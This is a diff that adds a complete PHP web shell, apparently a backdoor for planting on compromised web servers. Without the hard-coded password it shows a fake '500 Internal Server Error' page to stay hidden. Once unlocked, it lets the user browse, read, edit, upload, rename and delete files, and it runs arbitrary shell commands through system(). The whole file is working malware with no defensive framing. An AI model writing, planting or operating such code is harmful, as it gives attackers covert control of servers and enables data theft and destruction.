@@ -1,0 +1,184 @@
+<?php
+error_reporting(0);
+session_start();
+
+// Password: memek123
+$pass = "memek123";
+
+// Cek login
+if(isset($_GET['password'])) {
+    if($_GET['password'] === $pass) {
+        $_SESSION['login'] = true;
+    }
+}
+
+// Jika belum login
+if(!isset($_SESSION['login']) || $_SESSION['login'] !== true) {
+    echo '<!DOCTYPE html> <html lang="en"> <head>   <meta charset="UTF-8">   <title>500 Internal Server Error</title>   <style>     body {       background-color: #1a1a1a;       color: #e74c3c;       font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;       display: flex;       flex-direction: column;       align-items: center;       justify-content: center;       height: 100vh;       margin: 0;       text-align: center;     }      h1 {       font-size: 6rem;       margin: 0;     }      h2 {       font-size: 2rem;       margin: 0.5em 0;       color: #ffffff;     }      p {       font-size: 1.2rem;       color: #ccc;       max-width: 600px;     }      a {       margin-top: 1.5em;       display: inline-block;       padding: 0.75em 1.5em;       background-color: #e74c3c;       color: #fff;       text-decoration: none;       border-radius: 4px;       transition: background-color 0.3s ease;     }      a:hover {       background-color: #c0392b;     }   </style> </head> <body>   <h1>500</h1>   <h2>Internal Server Error</h2>   <p>Something went wrong on the server. This isn\'t your fault. Try again later or contact the site administrator if the issue persists.</p> </body> </html>';
+    exit();
+}
+
+// WEBSHELL START
+echo "<!DOCTYPE html>
+<html>
+<head>
+    <title>Caterscam Corp.</title>
+    <style>
+        body { font-family: monospace; background-color: #f9f9f9; padding: 20px; }
+        pre { font-size: 14px; }
+        .cmd-section { margin-top: 20px; }
+        .cmd-form { display: flex; gap: 10px; align-items: center; margin-bottom: 10px; }
+        .cmd-form input[type='text'] { flex: 1; padding: 5px; font-family: monospace; font-size: 14px; }
+        .cmd-form input[type='submit'] { padding: 5px 10px; }
+        textarea { width: 100%; height: 200px; font-family: monospace; font-size: 14px; }
+        a { text-decoration: none; color: #0645AD; }
+        a.visited { color: #b58900 !important; font-weight: bold; }
+        .logout { float: right; color: #e74c3c; font-weight: bold; }
+    </style>
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            document.querySelectorAll('a').forEach(function(link) {
+                if(localStorage.getItem(link.href)) {
+                    link.classList.add('visited');
+                }
+                link.addEventListener('click', function() {
+                    localStorage.setItem(link.href, '1');
+                });
+            });
+        });
+    </script>
+</head>
+<body>
+<a class='logout' href='?logout=1'>Logout</a><pre>";
+
+// Handle logout
+if(isset($_GET['logout'])) {
+    session_destroy();
+    header('Location: ' . $_SERVER['PHP_SELF']);
+    exit();
+}
+
+$cwd = realpath($_GET['path'] ?? getcwd());
+if(!$cwd || !file_exists($cwd)) $cwd = getcwd();
+
+// Handle delete
+if(isset($_GET['del'])) {
+    $target = realpath($_GET['del']);
+    if(is_file($target)) {
+        echo unlink($target) ? "[+] File deleted: $target\n" : "[-] Failed to delete file\n";
+    } elseif(is_dir($target)) {
+        echo rmdir($target) ? "[+] Directory deleted: $target\n" : "[-] Failed to delete directory\n";
+    }
+}
+
+// Handle rename
+if(isset($_GET['rename'], $_POST['newname'])) {
+    $old = realpath($_GET['rename']);
+    $new = dirname($old) . '/' . basename($_POST['newname']);
+    echo rename($old, $new) ? "[+] Renamed to: $new\n" : "[-] Rename failed\n";
+}
+
+// Handle file save
+if(isset($_GET['edit'], $_POST['content'])) {
+    $file = $cwd . '/' . basename($_GET['edit']);
+    echo file_put_contents($file, $_POST['content']) !== false ? "[+] File saved: $file\n" : "[-] Save failed\n";
+}
+
+// Handle file upload
+if(isset($_POST["upload"]) && isset($_FILES["up"])) {
+    $up = $_FILES["up"];
+    $dest = $cwd . "/" . basename($up["name"]);
+    echo move_uploaded_file($up["tmp_name"], $dest) ? "[+] Uploaded: " . $up["name"] . "\n" : "[-] Upload failed\n";
+}
+
+// Breadcrumb
+echo "<b>Current Dir:</b> ";
+$parts = explode("/", trim($cwd, "/"));
+$build = "";
+echo "<a href='?path=/'>/</a>";
+foreach($parts as $part) {
+    $build .= "/" . $part;
+    echo "<a href='?path=" . urlencode($build) . "'>$part</a>/";
+}
+echo "\n\n";
+
+// Directory listing
+$files = scandir($cwd);
+natcasesort($files);
+
+$dirs = [];
+$regularFiles = [];
+
+foreach($files as $f) {
+    if($f === "." || $f === "..") continue;
+    $full = $cwd . '/' . $f;
+    is_dir($full) ? $dirs[] = $f : $regularFiles[] = $f;
+}
+
+// Show directories
+foreach($dirs as $f) {
+    $full = $cwd . '/' . $f;
+    echo "[DIR]  <a href='?path=" . urlencode($full) . "'>$f</a> ";
+    echo "[ <a href='?del=" . urlencode($full) . "'>delete</a> | ";
+    echo "<a href='?rename=" . urlencode($full) . "'>rename</a> ]\n";
+}
+
+// Show files
+foreach($regularFiles as $f) {
+    $full = $cwd . '/' . $f;
+    echo "[FILE] <a href='?path=" . urlencode($cwd) . "&read=" . urlencode($f) . "'>$f</a> ";
+    echo "[ <a href='?path=" . urlencode($cwd) . "&edit=" . urlencode($f) . "'>edit</a> | ";
+    echo "<a href='?del=" . urlencode($full) . "'>delete</a> | ";
+    echo "<a href='?rename=" . urlencode($full) . "'>rename</a> ]\n";
+}
+
+// File viewer
+if(isset($_GET['read'])) {
+    $target = realpath($cwd . '/' . $_GET['read']);
+    if($target && is_file($target)) {
+        echo "\n<b>Viewing:</b> " . htmlspecialchars($target) . "\n\n";
+        echo htmlspecialchars(file_get_contents($target));
+    }
+}
+
+// Edit form
+if(isset($_GET['edit']) && !isset($_POST['content'])) {
+    $file = $cwd . '/' . basename($_GET['edit']);
+    $content = htmlspecialchars(@file_get_contents($file));
+    echo "<form method='POST'>
+    <textarea name='content'>$content</textarea><br>
+    <input type='submit' value='Save'>
+    </form>";
+}
+
+// Rename form
+if(isset($_GET['rename']) && !isset($_POST['newname'])) {
+    echo "<form method='POST'>
+    Rename to: <input type='text' name='newname'>
+    <input type='submit' value='Rename'>
+    </form>";
+}
+
+// Upload form
+echo "<br><form method='POST' enctype='multipart/form-data'>
+<b>Upload File:</b> <input type='file' name='up'><input type='submit' name='upload' value='Upload'><br>
+</form>";
+
+// Command Execution
+echo "<div class='cmd-section'>
+<form method='POST' class='cmd-form'>
+    <label><b>CMD:</b></label>
+    <input type='text' name='cmd'>
+    <input type='submit' value='Exec'>
+</form>";
+
+if(!empty($_POST["cmd"])) {
+    echo "<div>
+        <b>CMD Output:</b><br>
+        <textarea readonly>";
+    system($_POST["cmd"]);
+    echo "</textarea></div>";
+}
+
+echo "</div></pre></body></html>";
+?>
